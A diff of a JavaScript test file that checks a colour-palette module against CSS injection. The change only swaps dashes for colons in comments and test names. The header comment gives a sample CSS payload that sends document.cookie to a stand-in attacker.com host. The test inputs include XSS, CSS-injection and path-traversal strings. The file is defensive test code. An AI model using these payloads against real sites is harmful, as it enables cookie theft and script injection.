@@ -8,15 +8,15 @@
   ─────────────────────────────────
   The palette system writes CSS custom properties directly to
   document.documentElement via style.setProperty(). If an attacker could
-  supply an arbitrary key or value — for example by tampering with localStorage
-  before the page loads — they could inject any CSS expression, including:
+  supply an arbitrary key or value: for example by tampering with localStorage
+  before the page loads: they could inject any CSS expression, including:
 
     • url("https://attacker.com/?cookie="+document.cookie)
     • expression() in older IE engines
     • Overriding security-sensitive vars like --text on phishing overlays
 
   The defence: applyPalette() accepts ONLY a key from a hardcoded Set
-  (PALETTE_KEYS). Values are looked up from our own PALETTES object — user
+  (PALETTE_KEYS). Values are looked up from our own PALETTES object: user
   input never touches setProperty() directly.
 
   WHAT WE VERIFY:
@@ -25,7 +25,7 @@
   2. Invalid / unknown keys clear all managed vars (no partial application)
   3. null, "default", empty string, and injection strings all clear safely
   4. setProperty is NEVER called with a variable name outside MANAGED_VARS
-  5. clearPalette() removes exactly the managed vars — nothing more, nothing less
+  5. clearPalette() removes exactly the managed vars: nothing more, nothing less
   6. PALETTE_KEYS contains only the intended palette names (no silent additions)
   7. Every key in PALETTE_KEYS has both a "light" and "dark" variant defined
   ══════════════════════════════════════════════════════════════════════════════
@@ -97,7 +97,7 @@ describe("PALETTE_META completeness", () => {
   });
 });
 
-describe("applyPalette — valid keys", () => {
+describe("applyPalette: valid keys", () => {
   afterEach(() => {
     // Always clean up so tests don't bleed into each other
     clearPalette();
@@ -119,7 +119,7 @@ describe("applyPalette — valid keys", () => {
     }
   });
 
-  it("only writes vars in the MANAGED_VARS list — no extras", () => {
+  it("only writes vars in the MANAGED_VARS list: no extras", () => {
     /*
       Spy on setProperty to catch any var written outside the allowed list.
       This is the key CSS-injection prevention check.
@@ -135,7 +135,7 @@ describe("applyPalette — valid keys", () => {
     for (const prop of written) {
       expect(
         MANAGED_VARS.includes(prop),
-        `setProperty was called with unexpected var "${prop}" — possible injection vector`
+        `setProperty was called with unexpected var "${prop}": possible injection vector`
       ).toBe(true);
     }
 
@@ -155,7 +155,7 @@ describe("applyPalette — valid keys", () => {
   });
 });
 
-describe("applyPalette — invalid / injection inputs", () => {
+describe("applyPalette: invalid / injection inputs", () => {
   afterEach(() => clearPalette());
 
   const INVALID_KEYS = [
@@ -163,7 +163,7 @@ describe("applyPalette — invalid / injection inputs", () => {
     undefined,
     "default",
     "",
-    "EARTH",                        // case sensitive — must not match
+    "EARTH",                        // case sensitive: must not match
     "earth; color: red",            // CSS injection attempt
     "<script>alert(1)</script>",    // XSS attempt
     "../../etc/passwd",             // path traversal
@@ -202,7 +202,7 @@ describe("clearPalette", () => {
 
   it("does not touch non-managed vars (e.g. --paid, --sent)", () => {
     /*
-      clearPalette() should be surgical — only removing the vars it owns.
+      clearPalette() should be surgical: only removing the vars it owns.
       Status colors, fonts, and other vars must survive a palette reset.
     */
     document.documentElement.style.setProperty("--paid", "#1a5c3a");
@@ -218,7 +218,7 @@ describe("clearPalette", () => {
     document.documentElement.style.removeProperty("--sent");
   });
 
-  it("is idempotent — calling it twice has the same result as once", () => {
+  it("is idempotent: calling it twice has the same result as once", () => {
     applyPalette("stone", "dark");
     clearPalette();
     clearPalette(); // second call must not throw or re-apply anything
